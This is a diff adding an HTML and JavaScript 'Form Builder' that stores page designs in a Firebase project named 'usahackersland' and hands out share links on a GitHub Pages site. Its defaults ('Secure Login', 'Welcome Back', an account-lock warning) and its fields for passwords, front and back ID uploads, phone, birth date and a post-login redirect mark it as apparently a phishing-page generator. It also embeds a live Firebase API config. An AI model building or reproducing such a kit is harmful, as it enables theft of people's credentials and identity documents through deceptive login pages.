@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Form Builder with Firebase</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
+  <style>
+    body { font-family: sans-serif; background: #f0f2f5; padding: 20px; }
+    .container { max-width: 900px; margin: auto; background: #fff; padding: 20px; border-radius: 10px; }
+    input, textarea, button, select {
+      width: 100%; margin: 10px 0; padding: 10px;
+      border-radius: 5px; border: 1px solid #ccc;
+    }
+    label { margin: 10px 0 5px; display: block; font-weight: bold; }
+    .preview { border: 1px solid #ccc; background: #fff; padding: 15px; margin-top: 20px; border-radius: 10px; }
+    .share { margin-top: 15px; background: #e6f7ff; padding: 10px; border-radius: 6px; word-break: break-word; }
+    .media-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(100px, 1fr)); gap: 10px; }
+    .media-grid img, .media-grid video { width: 100%; border-radius: 6px; }
+    .avatar-preview img { width: 120px; height: 120px; border-radius: 50%; border: 2px solid #ccc; display: block; margin: auto; }
+  </style>
+</head>
+<body>
+<div class="container">
+  <h2>🎨 Form Builder</h2>
+  <p style="font-size:14px;color:gray;">
+    Use this form to build custom pages quickly. Paste URLs for images instead of uploading files.
+  </p>
+
+  <!-- Inputs -->
+  <label>SEO Page Title</label><input id="seoTitle" placeholder="Secure Login">
+  <label>Meta Description</label><textarea id="metaDesc" placeholder="Enter the page meta description"></textarea>
+  <label>OG Image URL</label><input id="ogImage" placeholder="https://example.com/image.jpg">
+
+  <!-- Avatar + Logo + Titles -->
+  <label>Avatar Image URL</label><input id="avatarURL" placeholder="https://example.com/avatar.jpg">
+  <label>Logo Image URL</label><input id="logoURL" placeholder="https://example.com/logo.png">
+  <label>Page Title</label><input id="title" placeholder="Welcome Back">
+  <label>Title Color</label><input type="color" id="titleColor">
+  <label>Page Subtitle</label><input id="subtitle" placeholder="Your subtitle here">
+  <label>Subtitle Color</label><input type="color" id="subtitleColor" value="#555555">
+
+  <!-- Other Media -->
+  <label>Banner Image URL</label><input id="bannerURL" placeholder="https://example.com/banner.jpg">
+  <label>Gallery Images (comma separated URLs)</label><textarea id="galleryImages" placeholder="https://img1.jpg, https://img2.jpg"></textarea>
+  <label>Videos (comma separated URLs)</label><textarea id="videoLinks" placeholder="https://video1.mp4, https://video2.mp4"></textarea>
+
+  <!-- Background -->
+  <label>Background Image URL</label><input id="bgImageURL" placeholder="https://example.com/bg.jpg">
+  <label>Background Size</label><input id="bgWidth" placeholder="100%"><input id="bgHeight" placeholder="auto">
+
+  <!-- Warning Message -->
+  <label><input type="checkbox" id="enableWarning" checked> Warning Message</label>
+  <textarea id="warning">⚠️ Failure to verify may result in account lock!</textarea>
+  <label>Warning Color</label><input type="color" id="warningColor">
+  <label>Description</label><textarea id="description" placeholder="Enter your description"></textarea>
+
+  <!-- Auth & Redirect -->
+  <label><input type="checkbox" id="addAuth"> Include Username & Password</label>
+  <input id="usernamePlaceholder" placeholder="Username">
+  <input id="passwordPlaceholder" placeholder="Password">
+  <label><input type="checkbox" id="useRedirect"> Enable Redirect Link</label>
+  <input id="redirectLink" placeholder="https://example.com/redirect">
+  <label>Redirect Description</label><input id="redirectDesc" placeholder="You’ll be redirected after login.">
+
+  <!-- ID & Extra -->
+  <label>Front ID Description</label><input id="frontDesc" placeholder="Upload front ID">
+  <label>Back ID Description</label><input id="backDesc" placeholder="Upload back ID">
+  <label>Extra Description</label><input id="extraDesc" placeholder="Optional text below fields">
+  <label>Extra Description Color</label><input type="color" id="extraDescColor">
+  <label>Extra Fields (one per line)</label><textarea id="extraFields" placeholder="Phone Number\nDate of Birth"></textarea>
+
+  <!-- Styles -->
+  <label>Text Color</label><input type="color" id="textColor">
+  <label>Background Color</label><input type="color" id="bgColor">
+  <label>Button Color</label><input type="color" id="btnColor">
+  <label>Button Text</label><input id="buttonText" value="Continue">
+  <label>Footer Text</label><input id="footerText" placeholder="© 2025 All rights reserved">
+
+  <label>Button Style</label>
+  <select id="btnStyle">
+    <option value="rounded">Rounded</option>
+    <option value="pill">Pill Shaped</option>
+    <option value="square">Square</option>
+    <option value="3d">3D Effect</option>
+    <option value="gradient">Gradient</option>
+  </select>
+
+  <label>Button Icon</label>
+  <select id="btnIcon">
+    <option value="none">No Icon</option>
+    <option value="arrow">➡️ Arrow</option>
+    <option value="check">✅ Check</option>
+    <option value="lock">🔒 Lock</option>
+    <option value="user">👤 User</option>
+    <option value="credit">💳 Credit Card</option>
+  </select>
+
+  <label>Hover Effect</label>
+  <select id="hoverEffect">
+    <option value="darken">Darken</option>
+    <option value="lighten">Lighten</option>
+    <option value="grow">Grow</option>
+    <option value="shrink">Shrink</option>
+    <option value="shadow">Shadow</option>
+  </select>
+
+  <label>Button Position</label>
+  <select id="btnPosition">
+    <option value="center">Center</option>
+    <option value="left">Left</option>
+    <option value="right">Right</option>
+  </select>
+
+  <label>Add Custom Field</label>
+  <input id="newField" placeholder="e.g. Verification Code">
+  <button onclick="addField()">Add Field</button>
+  <ul id="fieldsList"></ul>
+
+  <button onclick="generateForm()">✅ Generate Form</button>
+  <div class="preview"><strong>Live Preview</strong><div id="livePreview"></div></div>
+  <div class="share" id="shareLink" style="display:none;"></div>
+</div>
+
+<script>
+  const firebaseConfig = {
+    apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
+    authDomain: "usahackersland.firebaseapp.com",
+    projectId: "usahackersland",
+    storageBucket: "usahackersland.appspot.com",
+    messagingSenderId: "588407428267",
+    appId: "1:588407428267:web:7c4898cbb62efd3d5953ee"
+  };
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.firestore();
+  const $ = id => document.getElementById(id);
+  let fields = [];
+
+  function getButtonIcon(icon) {
+    switch (icon) {
+      case "arrow": return "➡️";
+      case "check": return "✅";
+      case "lock": return "🔒";
+      case "user": return "👤";
+      case "credit": return "💳";
+      default: return "";
+    }
+  }
+
+  function addField() {
+    const val = $('newField').value.trim();
+    if (val) {
+      fields.push(val);
+      $('newField').value = '';
+      renderFields();
+      buildPreview();
+    }
+  }
+
+  function renderFields() {
+    $('fieldsList').innerHTML = '';
+    fields.forEach(f => {
+      const li = document.createElement("li");
+      li.textContent = f;
+      $('fieldsList').appendChild(li);
+    });
+  }
+
+  function buildPreview() {
+    const get = id => $(id).value;
+    const galleryImages = get("galleryImages").split(",").map(i => i.trim()).filter(Boolean);
+    const videoLinks = get("videoLinks").split(",").map(i => i.trim()).filter(Boolean);
+
+    const htmlParts = [`<div style="background:${get("bgColor")};color:${get("textColor")};padding:20px;border-radius:10px;background-image:url('${get("bgImageURL")}');background-size:${get("bgWidth")} ${get("bgHeight")}">`];
+
+    if (get("avatarURL")) {
+      htmlParts.push(`<div style="text-align:center;">
+                        <img src="${get("avatarURL")}" style="width:120px;border-radius:50%;border:2px solid #ccc;">
+                      </div>`);
+    }
+    if (get("logoURL")) {
+      htmlParts.push(`<img src="${get("logoURL")}" style="width:100px;height:auto;display:block;margin:10px auto;">`);
+    }
+    if (get("title")) {
+      htmlParts.push(`<h2 style="text-align:center;color:${get("titleColor")}">${get("title")}</h2>`);
+    }
+    if (get("subtitle")) {
+      htmlParts.push(`<h4 style="text-align:center;color:${get("subtitleColor")};font-weight:normal;">${get("subtitle")}</h4>`);
+    }
+
+    if (get("bannerURL")) htmlParts.push(`<img src="${get("bannerURL")}" style="width:100%;margin:10px 0;border-radius:8px;">`);
+    if (get("description")) htmlParts.push(`<p style="text-align:center;">${get("description")}</p>`);
+    if ($("enableWarning").checked && get("warning")) {
+      htmlParts.push(`<p style="color:${get("warningColor")};text-align:center;font-weight:bold;">${get("warning")}</p>`);
+    }
+
+    htmlParts.push("<form>");
+    if ($("addAuth").checked) {
+      htmlParts.push(`<input placeholder="${get("usernamePlaceholder")}"><br><input placeholder="${get("passwordPlaceholder")}" type="password"><br>`);
+    }
+    if (get("frontDesc")) htmlParts.push(`<label>${get("frontDesc")}</label><input type="file"><br>`);
+    if (get("backDesc")) htmlParts.push(`<label>${get("backDesc")}</label><input type="file"><br>`);
+    if (get("extraDesc")) htmlParts.push(`<p style="color:${get("extraDescColor")}">${get("extraDesc")}</p>`);
+    [...fields, ...get("extraFields").split("\n")].forEach(f => {
+      if (f.trim()) htmlParts.push(`<input placeholder="${f.trim()}"><br>`);
+    });
+    htmlParts.push(`<button onclick="window.location.href='${get("redirectLink")}'" style="background:${get("btnColor")};padding:10px;margin:auto;display:block;">${getButtonIcon(get("btnIcon"))} ${get("buttonText")}</button>`);
+    if (get("footerText")) htmlParts.push(`<p style="text-align:center;">${get("footerText")}</p>`);
+    if ($("useRedirect").checked && get("redirectDesc")) htmlParts.push(`<p style="text-align:center;color:gray;">${get("redirectDesc")}</p>`);
+    htmlParts.push("</form>");
+
+    if (galleryImages.length || videoLinks.length) {
+      htmlParts.push(`<div class="media-grid">`);
+      galleryImages.forEach(url => htmlParts.push(`<img src="${url}" />`));
+      videoLinks.forEach(url => htmlParts.push(`<video controls src="${url}"></video>`));
+      htmlParts.push(`</div>`);
+    }
+    htmlParts.push("</div>");
+    $("livePreview").innerHTML = htmlParts.join('');
+  }
+
+  function generateForm() {
+    const get = id => $(id).value;
+    db.collection("forms").add({
+      seoTitle: get("seoTitle"),
+      metaDesc: get("metaDesc"),
+      ogImage: get("ogImage"),
+      title: get("title"),
+      subtitle: get("subtitle"),
+      subtitleColor: get("subtitleColor"),
+      titleColor: get("titleColor"),
+      description: get("description"),
+      warning: get("warning"),
+      warningColor: get("warningColor"),
+      usernamePlaceholder: get("usernamePlaceholder"),
+      passwordPlaceholder: get("passwordPlaceholder"),
+      addAuth: $("addAuth").checked,
+      useRedirect: $("useRedirect").checked,
+      redirectLink: get("redirectLink"),
+      redirectDesc: get("redirectDesc"),
+      frontDesc: get("frontDesc"),
+      backDesc: get("backDesc"),
+      extraDesc: get("extraDesc"),
+      extraDescColor: get("extraDescColor"),
+      extraFields: get("extraFields").split("\n"),
+      textColor: get("textColor"),
+      bgColor: get("bgColor"),
+      bgImageURL: get("bgImageURL"),
+      bgWidth: get("bgWidth"),
+      bgHeight: get("bgHeight"),
+      btnColor: get("btnColor"),
+      buttonText: get("buttonText"),
+      footerText: get("footerText"),
+      btnStyle: get("btnStyle"),
+      btnIcon: get("btnIcon"),
+      hoverEffect: get("hoverEffect"),
+      btnPosition: get("btnPosition"),
+      avatarURL: get("avatarURL"),
+      bannerURL: get("bannerURL"),
+      logoURL: get("logoURL"),
+      imageGallery: get("galleryImages").split(",").map(i => i.trim()).filter(Boolean),
+      videoGallery: get("videoLinks").split(",").map(i => i.trim()).filter(Boolean),
+      fields,
+      createdAt: new Date().toISOString()
+    }).then(docRef => {
+  const link = `https://bulksms4.github.io/Social-media-links/form.html?id=${docRef.id}`;
+  document.getElementById("shareLink").innerHTML = `
+    <strong>✅ Link:</strong> 
+    <a href="${link}" target="_blank">${link}</a>
+  `;
+  document.getElementById("shareLink").style.display = "block";
+}).catch(error => {
+  console.error("Error adding document: ", error);
+});
+  }
+
+  const inputs = [
+    "seoTitle", "metaDesc", "ogImage", "title", "subtitle", "subtitleColor", "titleColor", "avatarURL", "logoURL", 
+    "bannerURL", "galleryImages", "videoLinks", "description", "warning", "warningColor", "usernamePlaceholder", 
+    "passwordPlaceholder", "redirectLink", "redirectDesc", "frontDesc", "backDesc", "extraDesc", 
+    "extraDescColor", "extraFields", "textColor", "bgColor", "bgImageURL", "bgWidth", "bgHeight", 
+    "btnColor", "buttonText", "footerText", "btnStyle", "btnIcon", "hoverEffect", "btnPosition"
+  ];
+  inputs.forEach(id => $(id).addEventListener("input", buildPreview));
+  $("addAuth").addEventListener("change", buildPreview);
+  $("enableWarning").addEventListener("change", buildPreview);
+  buildPreview();
+</script>
+</body>
+  </html>
